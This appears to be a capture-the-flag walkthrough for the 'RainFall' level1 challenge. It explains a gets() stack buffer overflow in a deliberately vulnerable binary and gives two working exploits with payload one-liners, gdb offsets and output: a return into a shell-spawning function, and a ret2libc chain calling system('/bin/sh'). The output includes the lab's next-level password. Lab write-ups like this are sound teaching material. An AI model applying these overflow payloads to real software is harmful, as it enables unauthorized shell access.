# Level 1

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -fno-stack-protector -static source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void)
{
    char buffer[64];
    gets(buffer);
}
```

Let's focus on the `main` function. It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read.

Let's analyze the stack layout of our program:
```bash
(gdb) b *main+21 # Breaking before leave
Breakpoint 1 at 0x8048495

(gdb) r # Run the program
Starting program: /home/user/level1/level1

Breakpoint 1, 0x08048495 in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xbffff6e0       0xbffff6e0
ebp            0xbffff738       0xbffff738
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 88 bytes:
```
0xbffff738 - 0xbffff6e0 = 58 (88 in decimal)
```	

Furthermore, we can see that our buffer is located at `0x10(%esp),%eax`. Since there is 88 bytes for the stack, our buffer will therefore requiere 72 bytes (88 - 16) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 76 bytes (72 + 4).
> If you're struggling, you can just use a [Buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/), to find the offset of the return address. However it is recommended to understand how it works.

Anything written beyond those 76 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

There's different ways to solve this challenge, we'll see two of them. First the intended way with a ret to the run function and then the ret2libc way.
> When we refer to padding, we mean the bytes we need to write before reaching the return address.

### Ret2run
So, we need to find the address of the `run` function, which spawns a shell, to jump to it:
```
(gdb) info function run
All functions matching regular expression "run":

Non-debugging symbols:
0x08048444  run
```

Let's craft our payload:
```bash
padding + address of run

"\x90"*76 + "\x08\x04\x84\x44"
```

Let's run it:
```bash
level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x84\x44"[::-1])' && echo 'cat /home/user/level2/.pass') | ./level1
Good... Wait what?
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Perfect, let's move to the other solution.

### Ret2libc
Obviously, for this level, a ret2libc isn't necessary as we can just jump to the `run` function. However, it's a good exercise to understand how it works. I'll refer to this walkthrough in the future when a ret2libc is necessary.

Ret2Libc (Return-to-Libc) is an exploit technique that redirects the program flow to execute existing library functions.

A typical Ret2Libc exploit is constructed as follows:
```
padding + address of system + address of exit + address of "/bin/sh"

The address of exit is actually optional, but not providing it will cause the program to crash after executing the system function.
```

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0x08048360  system
0x08048360  system@plt

# Exit
(gdb) info function exit
0xb7e5ebe0  exit
0xb7e5ec10  on_exit

# /bin/sh
(gdb) info proc mappings
[...]
0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
[...]
(gdb) find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
0xb7f8cc58
1 pattern found.
```

Alright, let's craft our payload:
```
reminder: padding + address of system + address of exit + address of "/bin/sh"

"\x90"*76 + "\x08\x04\x83\x60" + "\xb7\xe5\xeb\xe0" + "\xb7\xf8\xcc\x58"
```

Let's run it:
```bash
level1@RainFall:~$ (python -c 'print("0"*76 + "\x08\x04\x83\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[:
:-1])' && echo 'cat /home/user/level2/.pass') | ./level1
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

We are now level2! Let's move on to the next level.
> We could also have used a ret2shellcode but since we'll be doing it in the next level, I'll skip it for now.